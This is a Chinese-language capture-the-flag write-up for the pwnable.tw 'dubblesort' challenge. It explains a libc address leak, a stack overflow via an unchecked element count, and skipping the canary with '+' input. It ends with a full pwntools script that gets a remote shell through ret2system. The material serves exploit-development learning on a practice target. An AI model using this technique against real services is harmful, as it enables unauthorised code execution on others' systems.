# [Pwnable.tw] Dubblesort

## 程序逻辑

本题的程序以一个整数集合作为输入，将整数集合布局在main函数的栈上，并进行原地排序，排序算法为冒泡排序。

1. 输入name
2. 输出name为首地址的字符串
3. 输入排序集合的大小
4. 输入集合的所有整数
5. 进行冒泡排序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  _BYTE *v4; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int sort_num; // [esp+18h] [ebp-74h] BYREF
  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF
  char name[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int v11; // [esp+7Ch] [ebp-10h]

  v11 = __readgsdword(0x14u);
  init();
  __printf_chk(1, (int)"What your name :");
  read(0, name, 64u);
  __printf_chk(1, (int)"Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &sort_num);
  v3 = sort_num;
  if ( sort_num )
  {
    v4 = v9;
    for ( i = 0; i < sort_num; ++i )
    {
      __printf_chk(1, (int)"Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      v3 = sort_num;
      v4 += 4;
    }
  }
  sort(v9, v3);
  puts("Result :");
  if ( sort_num )
  {
    for ( j = 0; j < sort_num; ++j )
      __printf_chk(1, (int)"%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v11 )
    sub_BA0();
  return result;
}
```

## 漏洞点

本题有3个可以利用的点，分别是：

1. 输出name为首地址的字符串：读入name时用的是read，read并不会自动补上`\x00`，因此这里会泄露name以外的内容
2. 输入排序集合的大小：由于排序集合位于栈上，且开辟的栈空间不足，然而大小是用int存的，会造成栈溢出
3. 输入集合的所有整数：输入使用格式化输入，格式化符号为`%u`，当输入非数字时，会将这一次的输入留在缓冲区中，但是不转化为int写到栈上。

第1点能够用于泄露地址，例如libc的地址、栈的地址、.text段的基地址等。

第2点能够用于改写main的返回地址，以及布局ROP frame。

第3点能够用于不往栈上的特定位置写数据。例如不往canary的位置写数据，由于我们泄露不了canary，只有不改写canary的值，才能通过栈溢出的检查。

## exploitation

先回答几个问题：

1. 如果能知道`system`以及`/bin/sh`的地址，是否能通过栈溢出的方式调用`system("bin/sh")`?

   当满足`canary <= addr(system) <= addr("/bin/sh")`时可以，该约束可以保证栈帧保持如下布局:

   ```
   |....|....|....|canary|....|saved ebp|address of system|....|address of "/bin/sh"|
   esp						 ebp	   ret address            arg of system
   ```

   该布局下的栈帧，能够通过栈溢出的检查，同时在main函数结束之后调用`system("/bin/sh")`。现在来看该约束是否可以达到，首先`canary <= addr(system)`，该约束大概率满足，因为`addr(system) > 0x7f000000`，而大部分canary小于该值。再看`addr(system) <= system("/bin/sh")`，这一点也能够满足，libc中有很多`/bin/sh`的gadget，只要找一个偏移大于system的即可。

2. 如何获得`system`的地址？

   这个问题实际上就是如何泄露libc的地址。在main的栈上有很多libc中的地址，其与libc基地址的偏移是固定的，我们可以gdb调试看一下离name的偏移量，同时也看一下栈上的地址值和libc基地址的距离（可以查看`/proc/{pid}/maps`来获得libc的基地址）。将name恰好设置为该偏移的长度，将libc的基地址泄露出来，并减去距离即可得到泄露的libc基地址。

   不过我并不清楚为什么栈上会有libc中的地址，我写了一个简单的helloworld看了下，其main函数栈上也确实有libc中的地址，其中应该有我不清楚的机制在。

现在攻击思路清晰了：

- 首先leak libc：设置`name="a"*25`，此处远程和本地有不同，本地需要`name="a"*29`。同时需要减去的距离为`0x1b000`，该距离可以通过比较真实的glibc加载地址得到（通过`/proc`）

- 栈溢出

  - 需要在canary的位置写入`"+"`，这样canary的值不会被覆盖，同时`"+"`留在缓冲区中也不会影响下一个输入的数字

  - 最后真实的栈布局如下

    ```
    |canary|system|···|system|binsh_addr|binsh_addr|
    	   system X 8        dummy arg  real arg 
    ```

    解释一下这个布局：

    1. 为什么要重复8次`system`？实际上第8个system的位置才是返回地址的真实位置，这是gdb动态调试的结果，ida中的偏移不准确

    2. 为什么重复2次`binsh_addr`？第一个binsh实际上是没用的，我跟进system函数才发现有这么一个步骤：

       ```assembly
       sub esp, 0xc
       mov eax, [esp+0x10]  
       ```

       这意味着ret2system之后，binsh应该位于`esp-0xc+0x10 = esp+4`的位置，也就是图中第二个binsh的位置

脚本如下：

```python
# !/bin/python3
from pwn import *
import subprocess
context.arch = "i386"
context.terminal = ["tmux","splitw","-h"]
# context.log_level = "debug"
def get_base_address(pid):
    cmd = f"cat /proc/{pid}/maps"+" | head -1 | awk -F- {'print $1'}"
    # print(cmd)
    addr = subprocess.check_output(cmd,shell=True).decode()
    return int(addr,16)

def get_libc_address(pid):
    cmd = f"cat /proc/{pid}/maps" + " | grep libc_32.so.6 | head -1 | awk -F- {'print $1'}"
    addr = subprocess.check_output(cmd,shell=True).decode()
    return int(addr,16)

def write_name(io, name:bytes) -> bytes:
    io.recvuntil(b"What your name :")
    io.send(name)
    io.recvuntil(b"Hello ")
    s = io.recvuntil(b",").strip(b",")
    return s

def write_nums(io, nums:list):
    io.recvuntil(b"How many numbers do you what to sort :")
    io.sendline(str(len(nums)).encode())
    for i in range(len(nums)):
        io.recvuntil(f"number : ".encode())
        io.sendline(str(nums[i]).encode())
        print(f"sent the {i}th number")

def gdb_script(_bin:ELF, breakpoints=[]):
    main_addr = _bin.address + 0x9c3
    scripts = f"set $base={_bin.address}\n"
    scripts+= f"set $main_addr={main_addr}\n"
    scripts+= f"b *($base+{0xA1D})\n"
    scripts+= f"c\n"
    #scripts+= f"x/32x $esp+0x3c\n"
    # scripts+= f"memory watch $esp+0x3c 32 dword\n"
    scripts+= f"b *($base+{0xAF9})\n"
    # scripts+= f"c\n"
    # scripts+= f"x/32x $esp+0x3c\n"
    return scripts

def leak_libc(io):
    # when leak this of remote libc, should use "a"*25
    # when leak this of local process, should use "a"*29
    base = write_name(io,b"a"*25)
    assert len(base) >= 28
    base = u32(base[25:28].rjust(4,b"\x00")) 
    # print(hex(base))
    base = base - 0x1b0000
    return base

def write_ret_address(io, _bin:ELF, address,args):
    printf_chk = 0xA32 + _bin.address
    main_addr = 0x9C3 + _bin.address
    puts_got = _bin.symbols['puts']
    nums = [0]*(0x60//4) + ['+'] + [address]*8
    for arg in args:
        nums += [arg]
    # print(nums)
    write_nums(io, nums)

DEBUG = False
ip = "chall.pwnable.tw"
port = 10101

def hack(io):
    
    _bin = ELF("./dubblesort")
    libc = ELF("./libc_32.so.6")
    # leak cannary 
    
    if DEBUG:
        _bin.address = get_base_address(pidof(io)[0])
        libc.address = get_libc_address(pidof(io)[0])
        print(f"text at {hex(_bin.address)}")
        print(f"libc at {hex(libc.address)}")

    # gdb.attach(io, gdbscript=gdb_script(_bin))
    #base = leak_base(io)
    #leak_libc(io,_bin)
    libc.address = leak_libc(io)
    print(f"leaked libc at {hex(libc.address)}")
    binshs = libc.search(b"/bin/sh")
    for _ in binshs:
        if _ > libc.symbols['system']:
            binsh_addr = _
            break
    print(f"bin sh at {hex(binsh_addr)}")
    print(f"system at {hex(libc.symbols['system'])}")
    write_ret_address(io, _bin, libc.symbols['system'], [ binsh_addr ]*2)
    # sleep(1)
    #leak_libc(io,_bin)
    #if io.poll() != None:
    #    raise EOFError
    # io.interactive()

if __name__ =="__main__":
    while True:
        try:
            if DEBUG:
                io = process("./dubblesort")
            else:
                io = remote(ip,port)
            hack(io)
            io.interactive()
            break
        except EOFError:
            print("Faied. Restarting...")
```

